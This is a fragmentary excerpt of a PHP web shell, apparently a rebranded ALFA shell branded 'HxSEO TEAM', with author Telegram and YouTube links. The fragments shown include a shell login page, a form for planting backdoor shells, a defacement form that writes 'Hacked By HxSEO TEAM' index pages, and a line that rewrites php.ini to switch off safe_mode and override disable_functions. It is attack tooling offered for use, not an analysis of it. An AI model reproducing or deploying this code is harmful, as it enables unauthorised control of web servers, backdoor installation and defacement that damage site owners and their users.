...
/*
	...
	Telegram: 	https://t.me/bukansmoky
	YouTube: 	https://youtube.com/demonsmoky
...
define("__ALFA_CODE_NAME__", "HxSEO TEAM");
define("__ALFA_DATA_FOLDER__", "HxSEO TEAM");
...
<title>~ HxSEO TEAM Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</title><center>
<center><img style="border-radius:100px;" width="500" height="250" alt="HxSEO TEAM 2012" draggable="false" src="https://haexgrup.com/wp-content/uploads/2025/05/hxhunter.gif" /></center>
<div id=loginbox><p><font face="verdana,arial" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ HxSEO TEAM Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</b></font></th></tr>
...
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ HxSEO TEAM Shell - v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ::..</title>
<style type="text/css">';?>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="HxSEO TEAM 2012" draggable="false" src="https://haexgrup.com/wp-content/uploads/2025/05/hxhunter.gif" /></td>
</tr>
<tr>
...
$textarea = "<div style='display:none;' id='backdoor_textarea'><div class='txtfont'>Your Shell:</div><p><textarea name='shell' rows='19' cols='103'><?php\n\techo('HxSEO TEAM is Here...!');\n?></textarea></p></div>";
$select = "<div class='txtfont'>Use:</div> <select name='method' style='width:155px;' onChange='inBackdoor(this);'><option value='alfa'>HxSEO TEAM Uploader</option><option value='my'>My Private Shell</option></select>";
...
<textarea name=index rows='19' cols='103'><title>Hacked By HxSEO TEAM</title><b>Hacked By HxSEO TEAM</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
...
<title>Hacked By HxSEO TEAM</title><b>Hacked By HxSEO TEAM</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['alfa6'])){
...
@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By HxSEO TEAM(HxSEO TEAM)");
...
<input type="text" name="defacer" size="67" id="text" placeholder="HxSEO TEAM 2012" />
<br>
